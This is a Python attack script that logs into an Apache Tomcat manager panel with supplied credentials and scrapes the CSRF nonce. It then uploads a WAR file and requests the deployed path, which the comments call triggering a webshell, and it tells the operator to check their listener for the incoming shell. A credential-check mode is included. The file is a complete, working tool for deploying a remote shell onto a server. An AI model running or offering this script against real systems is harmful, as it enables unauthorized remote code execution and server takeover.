import sys
import requests
from bs4 import BeautifulSoup
from requests.auth import HTTPBasicAuth
from urllib.parse import urlparse
import re
import argparse
import time

def argument_parser():
    parser = argparse.ArgumentParser(
        prog='Tomcat WAR file uploader',
        description='Uploads your WAR file to a Tomcat server')

    parser.add_argument('--url', required=True, help="Tomcat server URL")
    parser.add_argument('--manager-panel', default='/manager/html', help="Manager panel path (default: /manager/html)")
    parser.add_argument('--war-file', default='plugin.war', help="WAR file to upload (default: plugin.war)")

    parser.add_argument('--validate-credentials', action='store_true', help="Only check credentials and exit")
    parser.add_argument('--username', help="Username for authentication")
    parser.add_argument('--password', help="Password for authentication")

    args = parser.parse_args()

    return args
    
    
def validate_credentials(url, username, password):
    if not "/manager/html" in url:
        url += "/manager/html"
	
    auth = HTTPBasicAuth(username, password) 
    r = requests.get(url, auth=auth)
    if r.status_code != 401:
        print("[+] Credentials are valid")
        sys.exit()
    else:
        print("[-] Invalid credentials.")
        sys.exit()

	
def grab_csrf_token(manager_panel_html):
    csrf_match = re.search(r'CSRF_NONCE=([A-F0-9]+)', manager_panel_html)
    if csrf_match:
        csrf = csrf_match.group(1)
        print(f"[+] Parsed CSRF token: {csrf}")
        return csrf
    else:
        print("[-] Could not find CSRF token")
        return False
    
    return False 
	   
def upload_war_file(url, username, password, manager_panel, war_file):
    
    parsed_url = urlparse(url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
    session = requests.Session()
    auth = HTTPBasicAuth(username, password)
    
    res = session.get(base_url + "/manager/html", auth=auth)
    if res.status_code != 200:
        print("[-] Username or password is invalid.")
        sys.exit()
   
    CSRF_nonce = grab_csrf_token(res.text)
    
    if not CSRF_nonce:
        print("Couldn't retrieve CSRF token.")
        sys.exit()
        
    jsid = session.cookies.get('JSESSIONID')
    
    headers = {'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
			   'Origin': base_url,
			   'Referer': base_url + "/manager/html"
    }
    
    files = {
    'deployWar': (war_file, open(war_file, 'rb'), 'application/octet-stream')
    }
    
    res = session.post(base_url + "/manager/html/upload;jsessionid=" + jsid + "?org.apache.catalina.filters.CSRF_NONCE=" + CSRF_nonce, headers=headers, files=files,auth=auth)
    if res.status_code == 200:
        print("[+] War file uploaded successfuly")
    else:
        print("[-] Couldn't upload war file. Exitting...")
        sys.exit()
    
    #Trigger webshell
    shell_trigger = session.get(base_url + "/" + war_file.split('.')[0])
    if shell_trigger.status_code == 200:
        print("[+] Shell triggered. Check your listener")
    else:
        print("[-] Something went wrong while triggering shell")
    
    return
   

def main():
    args = argument_parser()
    if args.validate_credentials:
        validate_credentials(args.url, args.username, args.password)
    upload_war_file(args.url, args.username, args.password, args.manager_panel, args.war_file)
            
			
    
if __name__ == "__main__":
    main()

